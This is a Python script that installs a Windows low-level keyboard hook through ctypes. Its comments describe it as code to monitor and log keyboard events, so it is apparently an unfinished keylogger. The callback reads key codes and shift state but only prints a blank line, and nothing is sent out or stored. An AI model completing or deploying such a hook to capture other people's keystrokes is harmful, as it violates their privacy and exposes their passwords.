from ctypes.wintypes import MSG, DWORD, WPARAM, LPARAM
from ctypes import *
from ctypes import wintypes
import os
import json

user32 = windll.user32
kernel32 = windll.kernel32

last_key = None         # Holds the last key pressed
line = ""               # Holds the lines of keyboard characters pressed

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162
HC_ACTION = 0           # Parameter for KeyboardProc callback function

HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM) # Callback function

class KBDLLHOOKSTRUCT(Structure): _fields_=[ 
    ('vkCode',DWORD),
    ('scanCode',DWORD),
    ('flags',DWORD),
    ('time',DWORD),
    ('dwExtraInfo',DWORD)]

KEYS = []
with open(os.path.join(os.getcwd(), 'keycodes.json'), "r") as f:
    KEYS = json.load(f)["Keys"]

kernel32.GetModuleHandleW.restype = wintypes.HMODULE
kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
user32.SetWindowsHookExA.argtypes = (
    c_int,
    wintypes.HANDLE,
    wintypes.HMODULE,
    wintypes.DWORD,
)

class hook:
    """
    Class for installing/uninstalling a hook
    """

    def __init__(self):
        """
        Constructor for the hook class.

        Responsible for allowing methods to call functions from
        user32.dll and kernel32.dll.
        """
        self.user32 = user32
        self.kernel32 = kernel32
        self.is_hooked = None


    def install_hook(self, ptr):
        """
        Method for installing hook.

        Arguments
            ptr: pointer to the HOOKPROC callback function
        """
        self.is_hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ptr,
            kernel32.GetModuleHandleW(None),
            0
        )

        if not self.is_hooked:
            return False
        return True

    def uninstall_hook(self):
        """
        Method for uninstalling the hook.
        """

        if self.is_hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.is_hooked)
        self.is_hooked = None
                
def hook_procedure(nCode, wParam, lParam):
    """
    Hook procedure to monitor and log keyboard events.

    Arguments:
        nCode       = HC_ACTION code
        wParam      = Keyboard event message code
        lParam      = Address of keyboard input event

    """

    if nCode == HC_ACTION and wParam == WM_KEYDOWN:
        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        shift_pressed = (user32.GetKeyState(KEYS['LShift']) > 1 or 
                        user32.GetKeyState(KEYS['RShift']) > 1)
        keycode = kb.vkCode
        print()
        
    return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, c_ulonglong(lParam))

hook = hook()                           # Hook class
ptr = HOOKPROC(hook_procedure)          # Pointer to the callback function
print(hook.install_hook(ptr))                  # Installing hook
msg = MSG()   
# MSG data structure
user32.GetMessageA(byref(msg), 0, 0, 0)